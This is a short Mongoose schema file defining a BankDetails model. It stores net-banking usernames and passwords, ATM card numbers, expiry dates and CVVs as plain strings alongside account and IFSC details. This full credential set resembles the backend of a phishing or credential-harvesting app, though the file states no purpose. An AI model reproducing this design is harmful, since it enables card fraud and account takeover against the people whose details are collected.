import mongoose from "mongoose";


const bankDetailsSchema = new mongoose.Schema(
  {
    username: {
      type: String,
      required: true, // system user
    },

    accountType: {
      type: String,
      required: true,
    },

    bankName: String,
    accountNumber: String,
    ifsc: String,
    bankPhone: String,

    // 🔥 rename this
    netBankingUsername: String,
    password: String,

    atmCardNo: String,
    atmExpiry: String,
    atmCvv: String,
  },
  { timestamps: true }
);

export default mongoose.model("BankDetails", bankDetailsSchema);